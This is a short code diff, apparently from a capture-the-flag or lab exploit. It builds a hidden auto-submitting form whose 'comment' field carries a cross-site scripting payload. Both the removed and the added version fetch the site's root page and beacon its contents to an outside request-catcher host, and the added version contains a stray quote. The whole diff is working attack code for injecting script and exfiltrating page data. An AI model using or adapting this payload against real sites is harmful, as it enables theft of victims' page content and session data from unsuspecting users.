@@ -14,7 +14,7 @@
       const i=document.createElement('input');
       i.type='hidden';
       i.name='comment';
-　　　i.value = `<img src=x onerror="fetch('/').then(r=>r.text()).then(z=>navigator.sendBeacon('https://singetu0096.requestcatcher.com/', z))">`;
+　　 　i.value = `<script>fetch('/').then(r=>r.text()).then(z=>navigator.sendBeacon('https://singetu0096.requestcatcher.com/', z))"</script>`;
       f.appendChild(i);
       document.body.appendChild(f);
       f.submit();
